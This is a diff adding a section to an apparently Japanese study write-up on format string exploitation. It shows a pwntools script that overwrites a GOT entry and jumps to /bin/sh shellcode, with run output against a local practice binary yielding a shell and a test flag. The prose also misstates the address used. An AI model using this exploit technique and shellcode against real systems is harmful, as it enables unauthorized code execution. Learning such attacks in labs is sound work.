@@ -275,5 +275,83 @@ Shellが起動した
 
 # スクリプト化しよう
 
+Python2のpwntoolsを使用
+
+```python
+#!/usr/bin/env python2
+from pwn import *
+import sys
+
+def get_offset(a, b):
+    ret = (a - b) & 0xff
+    if ret == 0:
+        return 256
+    else:
+        return ret
+
+# https://www.exploit-db.com/exploits/13365/
+shellcode = '\x99\x31\xc0\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80'
+
+got_addr = 0x0804a018
+payload = p32(got_addr)
+payload += p32(got_addr + 1)
+payload += p32(got_addr + 2)
+payload += p32(got_addr + 3)
+
+payload += shellcode
+
+buf_addr = int(sys.argv[1], 16)
+# Our shellcode starts from buf_addr + 16
+a = map(ord, p32(buf_addr + 16))
+
+a[3] = get_offset(a[3], a[2])
+a[2] = get_offset(a[2], a[1])
+a[1] = get_offset(a[1], a[0])
+a[0] = get_offset(a[0], len(payload))
+
+fsa = ''
+fsa += '%%%dc%%%d$hhn' % (a[0], 10)
+fsa += '%%%dc%%%d$hhn' % (a[1], 11)
+fsa += '%%%dc%%%d$hhn' % (a[2], 12)
+fsa += '%%%dc%%%d$hhn' % (a[3], 13)
+
+payload += fsa
+
+# pwn
+p = process(['./fsb', payload])
+# p = process(['./fsb', abuf])
+p.interactive()
+```
+
+```sh
+/path/to/dir$ ./fsb AAAA
+[+] buf = 0xffffcc98
+AAAA
+/path/to/dir$ python script.py 0xffffcc98
+<type 'str'>
+[+] Starting local process './fsb': pid 19913
+[*] Switching to interactive mode
+[+] buf = 0xffffcc38
+[*] Got EOF while reading in interactive
+$ ls
+[*] Process './fsb' stopped with exit code -11 (SIGSEGV) (pid 19913)
+[*] Got EOF while sending in interactive
+```
+
+**AAAA** (4byte) 入れる場合と、shellcodeなど含むpayloadでは長さが違うため、bufferのアドレスも変わってしまっている
+新たに表示されたアドレス、**0xffffd1f8**で試してみる
+
+```sh
+/path/to/dir$ python script.py 0xffffcc38
+<type 'str'>
+[+] Starting local process './fsb': pid 19919
+[*] Switching to interactive mode
+[+] buf = 0xffffcc38
+$ ls
+flag  fsb  script.py  sec2.py
+$ cat flag
+FLAG{TEST_TEST_TEST_TEST}
+```
+
 
 [^1]: [format string attackによるGOT overwriteをやってみる](http://inaz2.hatenablog.com/entry/2014/04/20/041453)
